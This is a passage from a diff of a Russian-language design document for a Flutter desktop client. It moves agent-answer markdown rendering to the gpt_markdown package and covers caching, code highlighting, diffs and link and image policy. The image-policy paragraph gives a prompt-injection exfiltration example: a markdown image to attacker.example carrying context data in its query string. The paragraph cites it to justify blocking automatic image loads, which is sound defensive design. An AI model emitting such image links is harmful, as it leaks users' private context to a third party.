@@ -10,10 +10,19 @@
 подсветкой кода (D-06), diff правок (D-07), мысли модели в сворачиваемом блоке (D-08), usage и
 стоимость в статусе чата (D-09) и вложения в композере (D-12). Работа идёт после разделения
 Cubit-ов (задача 5.9): app получает `SessionView` из `codelab_client_core` и только отображает его.
-Логика проекции, разбора markdown (`IncrementalMarkdown`, §12.1.4), построения hunks
+Логика проекции, построения hunks
 (`LineDiff`, §12.1.3), строки инструмента (`ToolRowFormatter`, §12.1.6), статус-строки
 (`SessionStatusBar`, §12.1.5) и выбора `ContentBlock` (`PromptContentBuilder.build`, §12.1.7)
 остаётся в kit.
+
+> **Уточнение 2026-11-11 (решение пользователя, change [`add-desktop-markdown`](../../../../openspec/changes/add-desktop-markdown/design.md), D1).** Markdown
+> app разбирает не kit: ответ агента (`AgentTextItem.text`) рисует пакет `gpt_markdown` внутри
+> `codelab_ui` (`lib/src/rendering/`) со своими builder'ами и темой из `FluentTheme`; подсветка —
+> `val_highlight` за `CodeLabCodeHighlighter`. Модель `MarkdownDocument` и `IncrementalMarkdown`
+> (§12.1.4) остаются для CLI (change `add-cli-markdown`). Альтернатива «свой разбор в kit, своя
+> отрисовка блоков и `re_highlight`» — прежняя редакция этого раздела — отклонена пользователем
+> после прототипа. Ниже строки, которые она меняет, помечены ссылкой на change; имена `Acp*`
+> в остальных строках соответствуют нынешним `CodeLab*` кита.
 
 Исходная точка в коде сегодня:
 
@@ -45,22 +54,23 @@ Cubit-ов (задача 5.9): app получает `SessionView` из `codelab_
 
 | Компонент | Пакет / путь | Слой | Ответственность |
 |---|---|---|---|
-| `AcpTranscriptRow` и наследники, `AcpMdBlock`, `AcpMdInline` | `codelab_ui/lib/src/models/` | ui_kit | неизменяемые модели строк ленты и markdown-блоков |
+| `AcpTranscriptRow` и наследники (сейчас `CodeLabTranscriptRow`) | `codelab_ui/lib/src/organisms/` | ui_kit | неизменяемые модели строк ленты; ответ агента — `CodeLabAgentTextRow(id, text, streaming)`, без модели markdown-блоков (`add-desktop-markdown`, D3) |
 | `CodeLabTranscriptPanel` (расширен) | `codelab_ui/lib/src/organisms/` | ui_kit | виртуализированная лента строк, следование за хвостом, автопрокрутка к одобрению |
-| `AcpMarkdownBlockView`, `AcpCodeBlock` | `codelab_ui/lib/src/molecules/` | ui_kit | один markdown-блок; код с подсветкой, языком и кнопкой копирования |
+| `CodeLabMarkdown`, `CodeLabMarkdownConfig`, `CodeLabMarkdownScope`, `CodeLabCodeBlock` | `codelab_ui/lib/src/rendering/` | ui_kit | ответ агента через `gpt_markdown`: тема и builder'ы, созданные один раз; политика ссылок и изображений из app; код с подсветкой, языком и кнопкой копирования (`add-desktop-markdown`, D2–D4) |
 | `AcpThoughtBlock` | `codelab_ui/lib/src/molecules/` | ui_kit | сворачиваемый блок мыслей |
 | `AcpDiffView`, `AcpDiffViewerDialog` | `codelab_ui/lib/src/molecules/`, `organisms/` | ui_kit | unified и side-by-side, свёрнутый предпросмотр, полный просмотр в диалоге |
 | `AcpSessionStatusBar` | `codelab_ui/lib/src/molecules/` | ui_kit | модель, режим, токены, стоимость, заполнение контекста |
 | `AcpAttachmentChip`, композер с вложениями | `codelab_ui/lib/src/molecules/` | ui_kit | чипы, удаление, подсветка зоны сброса |
-| `AcpCodeHighlighter`, `AcpCodeTheme` | `codelab_ui/lib/src/rendering/` | ui_kit | токенизация кода (синхронно или в isolate), кеш, палитры светлой и тёмной темы |
+| `CodeLabCodeHighlighter`, `CodeLabCodeTheme` | `codelab_ui/lib/src/rendering/` | ui_kit | токенизация кода на `val_highlight` (синхронно или в isolate), кеш, палитры светлой и тёмной темы (`add-desktop-markdown`, D4) |
 | `TranscriptRowMapper` | `apps/codelab_desktop/lib/features/workbench/application/ui_mappers.dart` | application | `SessionView` → `List<AcpTranscriptRow>` с переиспользованием неизменившихся строк |
+| `isOpenableLink`, `isLoadableImage` | `apps/codelab_desktop/lib/features/workbench/application/link_policy.dart` | application | политика ссылок (`http`, `https`, `mailto`) и изображений (только `https`) для ленты (`add-desktop-markdown`, D2, D5, D6) |
 | `ActiveSessionCubit` (из 5.9) | `.../workbench/application/` | application | строки ленты и статус активной сессии |
 | `TranscriptViewCubit` | `.../workbench/application/` | application | только UI-состояние: ручное раскрытие блоков, режим diff |
 | `ComposerCubit` | `.../workbench/application/` | application | черновик и вложения по сессиям, лимиты, отправка через `SessionHandle.send` |
 | `AttachmentIntake`, `ClipboardAttachmentReader`, `ExternalLinkOpener` | `apps/codelab_desktop/lib/core/platform/` | infrastructure | чтение файлов и буфера, MIME, открытие URL |
 | `ComposerDropZone` | `.../workbench/presentation/widgets/` | presentation | обёртка над плагином drag&drop, передаёт только пути |
 | `ProjectFilesCubit` (после MVP, D-13, §12.6.8) | `apps/codelab_desktop/lib/features/project_files/application/` | application | раскрытые папки, плоский список видимых строк, предпросмотр |
-| `AcpFileTree`, `AcpFilePreview` (после MVP, §12.6.8) | `codelab_ui/lib/src/organisms/`, `models/` | ui_kit | виртуализированное дерево, просмотр с подсветкой (`AcpCodeHighlighter`) |
+| `AcpFileTree`, `AcpFilePreview` (после MVP, §12.6.8) | `codelab_ui/lib/src/organisms/`, `models/` | ui_kit | виртуализированное дерево, просмотр с подсветкой (`CodeLabCodeHighlighter`) |
 | `ProjectFilesTab` (после MVP, §12.6.8) | `.../project_files/presentation/` | presentation | вкладка сайдбара рядом с `CodeLabSessionSidebar`, связь с `ComposerCubit` |
 | `SessionSearchCubit` (после MVP, D-17, A12) | `.../workbench/application/` | application | владеет `SessionSearch` kit (§12.6.12): склейка ввода, фильтр даты, область, строки результатов |
 | `AcpSessionSearchField`, `AcpSessionSearchResults`, `AcpSessionSearchRowData` (после MVP, A12) | `codelab_ui/lib/src/molecules/`, `organisms/`, `models/` | ui_kit | поле поиска с фильтрами даты и области; список результатов с подсветкой и сниппетами |
@@ -156,12 +166,12 @@ sealed class AcpTranscriptRow { String get id; }
 final class AcpUserRow extends AcpTranscriptRow {
   final String text; final List<AcpAttachmentChipData> attachments; // только чтение
 }
-final class AcpAgentBlockRow extends AcpTranscriptRow {
-  final String groupId;          // id исходного AgentTextItem
-  final AcpMdBlock block;        // один блок верхнего уровня
-  final bool isTail;             // нестабильный хвост, перерисовывается при стриме
-  final bool isLastInGroup;      // показывает кнопку «Копировать ответ»
-  final String Function()? copyText; // ленивый исходный markdown всего ответа
+// Ответ агента — одна строка с исходным текстом; markdown разбирает gpt_markdown внутри
+// CodeLabMarkdown (change add-desktop-markdown, D1, D3). Строка на блок (AcpAgentBlockRow)
+// и «Копировать ответ» не вводятся.
+final class CodeLabAgentTextRow extends AcpTranscriptRow {
+  final String text;             // AgentTextItem.text
+  final bool streaming;          // последний ответ идущего хода, вычисляет маппер
 }
 final class AcpThoughtRow extends AcpTranscriptRow {
   final String text;             // ThoughtItem.text как есть: мысли не размечаются (§12.1.2, шаг 7)
@@ -183,7 +193,6 @@ class CodeLabTranscriptPanel extends StatefulWidget {
     Map<String, bool> expansionOverrides = const {},
     ValueChanged<({String rowId, bool expanded})>? onExpansionChanged,
     AcpDiffLayoutPreference diffLayout = AcpDiffLayoutPreference.auto,
-    AcpLinkTapCallback? onOpenLink,        // null — ссылки не кликабельны
     CodeLabViewMode viewMode = CodeLabViewMode.normal,
     String emptyLabel = 'No transcript yet',
     Key? key,
@@ -192,13 +201,18 @@ class CodeLabTranscriptPanel extends StatefulWidget {
   factory CodeLabTranscriptPanel.entries({required List<CodeLabTranscriptEntry> entries, ...});
 }
 
-class AcpMarkdownBlockView extends StatelessWidget {
-  const AcpMarkdownBlockView({required AcpMdBlock block, bool isTail = false,
-      AcpLinkTapCallback? onOpenLink, Key? key});
+// codelab_ui/lib/src/rendering/ (change add-desktop-markdown, D2–D4)
+class CodeLabMarkdown extends StatelessWidget {
+  const CodeLabMarkdown({required String text, bool streaming = false, Key? key});
 }
-class AcpCodeBlock extends StatefulWidget {
-  const AcpCodeBlock({required String code, String? language, bool closed = true,
-      int collapsedMaxLines = 40, Key? key});
+// Политика app над лентой; без scope ссылки и изображения неактивны.
+class CodeLabMarkdownScope extends InheritedWidget {
+  final bool Function(Uri) canOpenLink; final ValueChanged<Uri> onOpenLink;
+  final bool Function(Uri) canLoadImage; final ImageProvider Function(Uri) imageFor;
+  final Set<String> shownImages; final ValueChanged<String> onShowImage;
+}
+class CodeLabCodeBlock extends StatefulWidget {
+  const CodeLabCodeBlock({required String code, String? language, bool closed = true, Key? key});
 }
 class AcpThoughtBlock extends StatelessWidget {
   const AcpThoughtBlock({required AcpThoughtRow row, required bool expanded,
@@ -238,12 +252,10 @@ final class AcpAttachmentChipData {
   final List<String> warnings;             // готовые подписи AttachmentWarningKind
   final Uint8List? thumbnail;              // только для изображений, уменьшенная копия
 }
-
-typedef AcpLinkTapCallback = void Function(Uri uri);
 ```
 
 Ключи для тестов: `transcript-row-<id>`, `thought-toggle-<id>`, `diff-open-full-<id>`,
-`code-copy-<blockId>`, `status-bar-usage`, `status-bar-cost`, `status-bar-context`,
+`code-copy-<rowId>-<n>` (`n` — номер блока кода в ответе), `status-bar-usage`, `status-bar-cost`, `status-bar-context`,
 `composer-attachment-chip-<id>`, `composer-attachment-remove-<id>`, `composer-attach-button`,
 `composer-drop-zone`; после MVP (§12.6.8) — `file-tree-row-<relativePath>`, `file-tree-show-ignored`,
 `file-preview`.
@@ -264,7 +276,7 @@ abstract interface class ClipboardAttachmentReader {
   Future<List<PromptAttachment>?> read();
 }
 abstract interface class ExternalLinkOpener {
-  Future<bool> open(Uri uri);                      // только http, https, mailto
+  Future<bool> open(Uri uri);                      // только http, https, mailto; url_launcher
 }
 sealed class IntakeResult {}
 final class IntakeAccepted extends IntakeResult { final FileAttachment attachment; }
@@ -284,10 +296,10 @@ List<AcpTranscriptRow> previous)` вызывается на каждую нов�
    построенные из того же экземпляра (`identical`). Kit не пересоздаёт неизменившиеся элементы и
    закреплённые блоки markdown (VIEW-11, §12.1.2, шаг 8). Поэтому при стриме попадание в кеш
    идёт по всей ленте, кроме последнего элемента.
-2. `AgentTextItem` разворачивается в одну `AcpAgentBlockRow` на каждый блок
-   `markdown.blocks` (`MarkdownDocument`). Id строки — `<itemId>#<blockIndex>`. Блоки
-   `index < stableCount` получают `isTail = false` и кешируются по экземпляру `MdBlock`. Блоки
-   хвоста получают `isTail = true` и строятся заново.
+2. `AgentTextItem` → одна `CodeLabAgentTextRow(id, text, streaming)`; `streaming` — последний
+   элемент идущего хода. Разбор и кеш блоков — внутри `gpt_markdown` (A2, A3). Прежний вариант —
+   строка `AcpAgentBlockRow` на каждый блок `markdown.blocks` с id `<itemId>#<blockIndex>` —
+   отменён решением пользователя 2026-11-11 (change `add-desktop-markdown`, D1, D3).
 3. `ThoughtItem` → одна `AcpThoughtRow`. `ToolCallItem` → `AcpToolCallRow`: заголовок — из
    `ToolRowFormatter.format(item, now: clock.now(), cwd: …)` (`ToolRowView`), статус — из
    `ToolCallStatusView`, diff — из каждого `ToolDiffContent.diff`, хвост терминала — из
@@ -307,31 +319,39 @@ sequenceDiagram
     participant M as "TranscriptRowMapper"
     participant C as "ActiveSessionCubit"
     participant L as "CodeLabTranscriptPanel"
-    participant H as "AcpCodeHighlighter"
-    K->>M: "SessionView rev N, хвост изменился"
-    M->>M: "стабильные строки из кеша, хвост заново"
-    M->>C: "rows, старые экземпляры кроме хвоста"
-    C->>L: "emit не чаще одного раза за кадр"
-    L->>L: "перестраивается только строка хвоста"
-    Note over L: "незакрытый блок кода рисуется моноширинно без подсветки"
-    K->>M: "rev N+1, блок кода закрыт и стал стабильным"
-    M->>C: "новая стабильная строка с кодом"
+    participant G as "GptMarkdown (rendering/)"
+    participant H as "CodeLabCodeHighlighter"
+    K->>M: "SessionView rev N, текст ответа вырос"
+    M->>C: "rows: прежние строки, новая строка ответа"
     C->>L: "emit"
-    L->>H: "tryHighlightSync для малого кода"
-    H-->>L: "токены или null"
-    L->>H: "highlight в isolate для большого кода"
-    H-->>L: "токены, строка перерисована один раз"
+    L->>G: "тот же CodeLabMarkdownConfig, новый text"
+    G->>G: "закрытые сегменты из кеша, хвост заново"
+    Note over G: "незакрытый блок кода — codeBuilder(closed: false), моноширинно"
+    K->>M: "rev N+1, ограда закрыта"
+    M->>C: "rows"
+    C->>L: "emit"
+    L->>G: "text"
+    G->>H: "codeBuilder(closed: true): tryHighlightSync для малого кода"
+    H-->>G: "токены или null"
+    G->>H: "highlight в isolate для большого кода"
+    H-->>G: "токены, блок перерисован один раз"
 ```
 
 1. `CodeLabTranscriptPanel` строит `ListView.builder` с `ValueKey(row.id)` и
    `findChildIndexCallback`. Вставка строк выше не пересоздаёт `State` нижних строк.
-2. `AcpMarkdownBlockView` для стабильной строки обёрнут в `RepaintBoundary`. Родитель
-   переиспользует тот же экземпляр модели, поэтому `Element` не перестраивается
-   (`row == oldRow`, проверка по `identical`).
-3. Хвост рисуется тем же виджетом, но без асинхронной подсветки. Незакрытый блок кода
-   (`closed == false`) выводится моноширинным текстом. Таблица без завершённой строки-разделителя
-   выводится как абзац. Так хвост не прыгает между вариантами разметки.
-4. Частоту обновлений ограничивает kit: не больше одной публикации за кадр (§9.10, шаг 8).
+2. Ответ рисует `GptMarkdown(text, isStreaming: streaming, animation: none)`. Пакет делит
+   документ на сегменты верхнего уровня и кеширует виджет каждого; при дописывании текста
+   перестраивается только хвост. Кеш работает, только если тема (`GptMarkdownThemeData`),
+   builder'ы и `htmlTags` — те же объекты между сборками: пакет сравнивает их по identity, а
+   новая тема на каждой сборке перестраивает все закрытые блоки (в прототипе — в 3–4 раза
+   медленнее). Поэтому `CodeLabMarkdownConfig` создаётся один раз на тему Fluent и хранится в
+   `State` ленты, builder'ы — его поля; политика app приходит через `CodeLabMarkdownScope` и
+   читается из `context`, не пересоздавая конфигурацию (change `add-desktop-markdown`, D3).
+   `SliverGptMarkdown` не используется: лента — `ListView.builder` строк.
+3. Незакрытый блок кода (`codeBuilder` с `closed == false`) выводится моноширинным текстом без
+   подсветки (DSK-6). Таблица до строки-разделителя — абзац (так разбирает пакет).
+4. Частоту обновлений ограничивает kit: не больше одной публикации за кадр (§9.10, шаг 8; на
+   2026-11-11 склейка не реализована, Flutter всё равно строит не больше одного кадра).
    Дополнительно Cubit склеивает эмиты в `SchedulerBinding.scheduleFrameCallback`. Это
    ограничение только на границе отображения (`streaming.md`, §15), события не теряются.
 5. Следование за хвостом. Если перед обновлением список был в пределах 80 px от низа
@@ -340,34 +360,49 @@ sequenceDiagram
    «К последнему сообщению». Существующая анимированная автопрокрутка к новому ожидающему
    одобрению сохраняется без изменений.
 
-**A3. Markdown.** Разбор выполняет kit (§12.1). Десктоп только рисует блоки:
+**A3. Markdown.** Ответ агента разбирает и рисует пакет `gpt_markdown` внутри
+`codelab_ui/lib/src/rendering/`; app markdown не разбирает (DSK-2; решение пользователя
+2026-11-11, change `add-desktop-markdown`, D1–D9). Пакет вызывается без Material-предка, поэтому
+всё, что он по умолчанию берёт из Material, заменено своими builder'ами:
 
-| Блок / inline | Отображение |
+| Элемент | Отображение |
 |---|---|
-| заголовки 1–6 | `typography.title` / `subtitle` / `bodyStrong` из `FluentTheme` |
-| абзац, курсив, жирный, зачёркнутый, inline-код | `Text.rich` с `TextSpan`; inline-код — моноширинный шрифт на фоне `resources.subtleFillColorSecondary` |
-| `MdList`, вложенные списки, задачи (`MdListItem.checked != null`) | отступ 20 px на уровень; задачи — неинтерактивный флажок |
-| цитата | левая полоса `accentColor` с прозрачностью |
-| таблица | `Table` с горизонтальной прокруткой при нехватке ширины; выравнивание столбцов из модели |
-| блок кода | `AcpCodeBlock`: язык, кнопка «Копировать», подсветка, сворачивание длиннее 40 строк |
-| ссылка | подчёркнутый `accentColor`, подсказка с полным URL |
-| `MdImage(alt, src)` | не загружается (VIEW-12); выводится как ссылка с текстом `alt` и `src` в подсказке, по правилам ссылок ниже |
-| сырой HTML | выводится как текст |
+| тема | `GptMarkdownThemeData` из `FluentTheme` (типографика, `accentColor`, `resources`), без `Theme.of` Material |
+| заголовки, абзац, курсив, жирный, зачёркнутый, inline-код, цитата, таблица, черта | разметка пакета со стилями темы; inline-код — моноширинный шрифт на `resources.subtleFillColorSecondary` |
+| списки задач | `checkboxBuilder` → Fluent `Checkbox` только для чтения (встроенный флажок без Material-предка падает, issue #154 пакета) |
+| блок кода | `codeBuilder` → `CodeLabCodeBlock`: подпись языка вне выделения (`SelectionContainer.disabled`), кнопка «Copy», подсветка (A4); встроенная подсветка пакета не используется — в тёмной теме Fluent она светлая |
+| ссылка | `inlineLinkBuilder` и `linkBuilder` по `url` из пакета (не по тексту, как `onLinkTap`); правила ниже |
+| изображение | `imageBuilder` всегда переопределён — без него пакет сам грузит PNG и SVG; правила ниже |
+| HTML | `html: false`: теги показываются текстом как написаны, `<img>` и `<a>` не становятся элементами |
+| формулы | только `\(…\)` и `\[…\]` (`val_latex_flutter`, без сети); `$` — обычный символ (`useDollarSignsForLatex: false`) |
 
-Выделение текста работает через `SelectionArea` вокруг ленты; оно пересекает границы строк, в
-том числе блоков одного ответа. Кнопка «Копировать» блока кода кладёт в буфер исходный код без
-нумерации. Кнопка «Копировать ответ» последней строки группы кладёт исходный markdown, полученный
-через `copyText`. Запись в буфер — обычное действие пользователя на границе presentation
-(`platform-integration.md`, §29).
+Выделение текста — `SelectionArea` вокруг строки ответа; ограничение пакета: при копировании
+через несколько блоков между ними нет перевода строки. Кнопка «Copy» блока кода кладёт в буфер
+исходный код без ограды. Запись в буфер — обычное действие пользователя на границе presentation
+(`platform-integration.md`, §29). «Копировать ответ» и выделение через несколько строк ленты не
+вводятся (change `add-desktop-markdown`, решение Q5).
 
-Политика ссылок: клик вызывает `onOpenLink`. Cubit открывает небольшое окно подтверждения с
-полным URL и кнопками «Открыть» и «Копировать», затем `ExternalLinkOpener.open`. Схемы, кроме
-`http`, `https` и `mailto`, не кликабельны и показываются текстом. Относительные пути и
-`file:` тоже не открываются: подсказка показывает путь, кнопка копирует его. Агент не может
+Политика ссылок. Решение принимает app (`isOpenableLink` в `link_policy.dart`) и передаёт через
+`CodeLabMarkdownScope`. Активна ссылка `http` или `https` с непустым хостом либо `mailto` с
+адресом: подчёркнутый `accentColor`, полный адрес в подсказке (управляющие и bidi-символы
+экранированы). Клик сразу вызывает `onOpenLink` → `CodeLabShellCubit.openExternalLink` →
+повторная проверка схемы → `ExternalLinkOpener.open` (`url_launcher`). Окна подтверждения нет —
+решение пользователя 2026-11-11 (прежняя редакция предлагала окно с «Открыть» и «Копировать»).
+Прочие схемы (`file:`, `javascript:`, `data:`, `vscode:`, `xmpp:`), protocol-relative адреса и
+относительные пути — обычный текст. Журнал — схема, хост, исход, без пути и query. Агент не может
 открыть URL сам: открытие всегда начинается с клика пользователя (`platform-integration.md`,
 §35).
 
-**A4. Подсветка кода.** `AcpCodeHighlighter` возвращает токены как `(start, end, AcpTokenClass)`
+Политика изображений (VIEW-12, DSK-7). Изображение не загружается без явного действия
+пользователя: автозагрузка — канал утечки через prompt injection
+(`![](https://attacker.example/?d=<данные из контекста>)`). По умолчанию — заглушка «Image» с
+хостом и именем файла (пакет не передаёт `alt` в `imageBuilder`) и полным адресом в подсказке.
+Кнопка «Show image» — только для `https` с хостом (`isLoadableImage`); после клика app
+загружает картинку через `ResizeImage(NetworkImage)`. Выбор хранится в `TranscriptViewCubit` по
+строке и адресу на время запуска.
+
+**A4. Подсветка кода.** `CodeLabCodeHighlighter` на движке `val_highlight` (чистый Dart, приходит
+с `gpt_markdown`; change `add-desktop-markdown`, D4) возвращает токены как `(start, end, CodeLabTokenClass)`
 по строкам. Эти данные состоят из простых чисел и enum и передаются между isolate без
 копирования объектов Flutter.
 
@@ -375,15 +410,18 @@ sequenceDiagram
 |---|---|
 | ≤ 300 строк и ≤ 16 КиБ | синхронно в кадре построения (типичная стоимость заметно ниже бюджета кадра) |
 | ≤ 5000 строк и ≤ 256 КиБ | `compute`; до результата — моноширинный текст без цвета, затем одна перерисовка |
-| больше | без подсветки, свёрнуто, полный просмотр в диалоге с виртуализированным списком строк |
+| больше | без подсветки; для diff (A5) — свёрнуто, полный просмотр в диалоге с виртуализированным списком строк; блок кода в ответе показывается целиком без подсветки (сворачивание и диалог не входят в change `add-desktop-markdown`) |
 
 Результат кешируется в LRU на 256 записей по ключу `(language, hash(code))`. Повторное
 построение строки, например после прокрутки, не запускает токенизацию снова. Язык берётся из
 info-строки блока. Неизвестный язык или его отсутствие → без подсветки, автоопределение не
-выполняется (оно дорогое и часто ошибается). Цвета токенов задаёт `AcpCodeTheme` — расширение
-`FluentThemeData.extensions` с палитрами для светлой и тёмной темы. По умолчанию палитра
-выбирается по `FluentTheme.brightness`. Шрифт: системный моноширинный список (`SF Mono`,
-`Menlo`, `Consolas`, `monospace`) без встраивания шрифтов в сборку.
+выполняется (оно дорогое и часто ошибается; автоопределение `val_highlight` не используется).
+Цвета токенов задаёт `CodeLabCodeTheme` — расширение `FluentThemeData.extensions` со своими
+палитрами светлой и тёмной темы из ролей `FluentTheme`, контраст ≥ 4,5:1 (темы `val_highlight`
+не используются, решение Q4). Палитра выбирается по `FluentTheme.brightness`. Шрифт: системный
+моноширинный список (`SF Mono`, `Menlo`, `Consolas`, `monospace`); шрифты JetBrains Mono
+(`gpt_markdown`) и Latin Modern (`val_latex_flutter`) попадают в сборку с пакетами и указаны в
+`THIRD_PARTY_NOTICES.md`.
 
 **A5. Diff.** Источник — `ToolDiffContent.diff` (`DiffView`, §12.1.3): `displayPath`, `change`
 (`created | modified | deleted`), `hunks` (`DiffHunk` из `DiffLine` с `DiffOp`, номерами строк и
@@ -400,7 +438,7 @@ info-строки блока. Неизвестный язык или его от
 3. Большой diff (> 300 строк во всех hunks или > 512 КиБ текста) всегда свёрнут: показываются
    сводка, путь и первые 20 строк с кнопкой «Показать полностью» (`diff-open-full-<id>`).
    Кнопка открывает `AcpDiffViewerDialog` с виртуализированным `ListView.builder` по строкам.
-4. Подсветка внутри diff — по расширению пути (тот же `AcpCodeHighlighter`), и только когда весь
+4. Подсветка внутри diff — по расширению пути (тот же `CodeLabCodeHighlighter`), и только когда весь
    diff попадает в лимит `compute` из A4. Цвет фона строки — `CodeLabTone.success` и `CodeLabTone.danger`
    с прозрачностью из темы. Знаки `+` и `−` в поле номеров строк показываются всегда, поэтому
    цвет не единственный носитель смысла.
@@ -833,10 +871,10 @@ R8-3, R8-4; design.md change `add-config-literal-secrets-and-migrate`, D8).** Л
 ## 12.3.4. Примеры
 
 Ответ агента «Исправил:\n\n```dart\nfinal a = 1;\n```\nГотово.» во время стрима, сразу после
-прихода «```dart\nfinal a» даёт строки `msg-7#0` (абзац, стабильный) и `msg-7#1` (код,
-`isTail`, `closed: false`, моноширинно). Когда приходит закрывающая ограда, `msg-7#1` становится
-стабильной и подсвечивается синхронно (одна строка кода). Строка `msg-7#2` («Готово.») — новый
-хвост. `msg-7#0` за всё время строится один раз.
+прихода «```dart\nfinal a» даёт одну строку `agent-7` (`streaming: true`): в ней абзац —
+закрытый сегмент `gpt_markdown`, а код — хвост, `codeBuilder(closed: false)`, моноширинно. Когда
+приходит закрывающая ограда, блок кода становится закрытым сегментом и подсвечивается синхронно
+(одна строка кода). «Готово.» — новый хвост. Абзац за всё время строится один раз (DSK-3).
 
 Правка `lib/a.dart` на 1200 строк изменений при ширине ленты 1100 px в режиме `normal`: заголовок
 `lib/a.dart  +900 −300`, первые 20 строк side-by-side без подсветки (вне лимита) и кнопка
@@ -856,19 +894,27 @@ R8-3, R8-4; design.md change `add-config-literal-secrets-and-migrate`, D8).** Л
 
 1. **DSK-1.** Виджеты `codelab_ui` НЕ ДОЛЖНЫ импортировать `codelab_client_core`, `codelab_acp_protocol` или
    плагины платформы. Модели kit превращает в модели `codelab_ui` только `ui_mappers.dart`.
-2. **DSK-2.** Разбор markdown, построение hunks и выбор `ContentBlock` ДОЛЖНЫ выполняться в kit.
-   Десктоп НЕ ДОЛЖЕН разбирать markdown или вычислять diff заново.
-3. **DSK-3.** Блок стабильного префикса ДОЛЖЕН строиться не больше одного раза за время стрима
-   ответа. Обновление хвоста НЕ ДОЛЖНО перестраивать строки стабильного префикса и другие
-   элементы ленты.
+2. **DSK-2.** Построение hunks и выбор `ContentBlock` ДОЛЖНЫ выполняться в kit; десктоп НЕ ДОЛЖЕН
+   вычислять diff заново. Markdown ответа агента разбирает пакет `gpt_markdown` только внутри
+   `codelab_ui/lib/src/rendering/`; Cubit-ы, мапперы и прочий код app НЕ ДОЛЖНЫ разбирать
+   markdown (уточнение 2026-11-11, change `add-desktop-markdown`, D1, D2).
+3. **DSK-3.** Закрытый блок ответа ДОЛЖЕН строиться не больше одного раза за время стрима
+   ответа. Обновление хвоста НЕ ДОЛЖНО перестраивать закрытые блоки и другие элементы ленты.
+   Выполняется кешем сегментов `gpt_markdown` при теме и builder'ах, созданных один раз
+   (A2, шаг 2; change `add-desktop-markdown`, D3).
 4. **DSK-4.** Маппер ДОЛЖЕН переиспользовать экземпляр `AcpTranscriptRow` для неизменившегося
-   элемента kit (`identical`). Работа на один chunk ДОЛЖНА быть O(размер хвоста).
+   элемента kit (`identical`). Работа на один chunk ДОЛЖНА быть O(размер хвоста). На 2026-11-11
+   не реализовано: маппер строит строки заново, а стоимость ответа держит кеш сегментов
+   `gpt_markdown` (DSK-3); change `add-desktop-markdown` DSK-4 не вводит.
 5. **DSK-5.** Токенизация кода больше синхронного лимита (300 строк или 16 КиБ) НЕ ДОЛЖНА
    выполняться в UI isolate. Код больше 5000 строк или 256 КиБ НЕ ДОЛЖЕН подсвечиваться inline.
 6. **DSK-6.** Незакрытый блок кода в хвосте ДОЛЖЕН рисоваться моноширинным текстом без
-   подсветки. Подсветка запускается только для стабильного блока.
-7. **DSK-7.** Ссылка ДОЛЖНА открываться только по клику пользователя, после показа полного URL,
-   и только для `http`, `https`, `mailto`. Изображения из markdown НЕ ДОЛЖНЫ загружаться.
+   подсветки. Подсветка запускается только для закрытого блока.
+7. **DSK-7.** Ссылка ДОЛЖНА открываться только по клику пользователя и только для `http`, `https`,
+   `mailto`; полный адрес ДОЛЖЕН быть виден в подсказке, ссылки с другими схемами НЕ ДОЛЖНЫ быть
+   активными. Изображения из ответа НЕ ДОЛЖНЫ загружаться без явного действия пользователя и
+   ДОЛЖНЫ загружаться только по `https` (уточнение 2026-11-11, решение пользователя, change
+   `add-desktop-markdown`, D5, D6; VIEW-12).
 8. **DSK-8.** Diff ДОЛЖЕН показываться unified при ширине строки меньше 960 px и side-by-side
    при ≥ 960 px, если пользователь не выбрал форму вручную. Diff больше 300 строк ДОЛЖЕН быть
    свёрнут inline, а полный просмотр ДОЛЖЕН быть виртуализирован.
@@ -902,7 +948,7 @@ R8-3, R8-4; design.md change `add-config-literal-secrets-and-migrate`, D8).** Л
     (`AcpDiffView` в режиме `preview` вместо текстового `diffSummary`, A5, шаг 6).
 18. **DSK-18.** Новые сочетания клавиш НЕ ДОЛЖНЫ переназначать существующие (Cmd/Ctrl+K, Esc,
     Cmd/Ctrl+Enter, Cmd/Ctrl+Backspace, Alt+←/→).
-19. **DSK-19.** Цвета ДОЛЖНЫ браться из `FluentTheme`, `CodeLabTone` и `AcpCodeTheme`; литералы цветов
+19. **DSK-19.** Цвета ДОЛЖНЫ браться из `FluentTheme`, `CodeLabTone` и `CodeLabCodeTheme`; литералы цветов
     в виджетах ленты НЕ ДОЛЖНЫ появляться. Обе темы ДОЛЖНЫ давать контраст не ниже 4,5:1.
 20. **DSK-20.** Состояние раскрытия и выбор формы diff НЕ ДОЛЖНЫ храниться в kit и в журнале
     сессии: это UI-состояние текущего запуска.
@@ -939,22 +985,30 @@ R8-3, R8-4; design.md change `add-config-literal-secrets-and-migrate`, D8).** Л
 
 * **Свои презентационные модели в `codelab_ui`, а не зависимость от kit.** Сегодня `codelab_ui` зависит
   только от `fluent_ui`, `flutter_bloc` и `freezed_annotation`. Превью и widget-тесты строят
-  модели без ядра клиента, и задача 5.9 уже требует маппинга в модели `codelab_ui`. Цена —
-  зеркальные типы `AcpMdBlock` (~150 строк маппера). Мемоизация по `identical` делает маппинг
-  бесплатным для стабильной части. Вариант «`codelab_ui` зависит от kit» отклонён: ui_kit стал бы
+  модели без ядра клиента, и задача 5.9 уже требует маппинга в модели `codelab_ui`. Для markdown
+  зеркальных типов нет: строка ответа несёт исходный текст (change `add-desktop-markdown`, D3).
+  Вариант «`codelab_ui` зависит от kit» отклонён: ui_kit стал бы
   тянуть доменные типы, а изменение view model kit ломало бы ui_kit.
-* **Строка ленты на блок markdown.** Если строка — целое сообщение, длинный ответ строится
-  целиком, и вложенный `Column` не виртуализируется. При строке на блок список виртуализирует
-  и длинные ответы, а граница «стабильный префикс / хвост» естественно совпадает с границей
-  строк. Минус: выделение текста через несколько строк требует `SelectionArea` на уровне ленты.
-  Flutter это поддерживает.
-* **Рендерер markdown свой, без пакета-виджета.** AST уже даёт kit, общий с CLI. Пакеты-виджеты
-  разбирают строку сами, а значит вся инкрементальность kit пропала бы, и пришлось бы
-  перепарсивать сообщение на каждый chunk. Рендер блоков в `TextSpan` и `Table` — несколько сотен
-  строк на теме Fluent без чужой стилизации.
+* **Markdown — пакет `gpt_markdown`, одна строка ленты на ответ** (решение пользователя
+  2026-11-11 после прототипа; change [`add-desktop-markdown`](../../../../openspec/changes/add-desktop-markdown/design.md), D1–D3). Пакет сам
+  делит документ на сегменты и перестраивает только хвост, поэтому инкрементальность kit для app
+  не нужна; готовы таблицы, задачи, формулы и выделение. Условия: без Material-предка, свои
+  `codeBuilder`, `checkboxBuilder`, `imageBuilder`, `inlineLinkBuilder` и тема из `FluentTheme`,
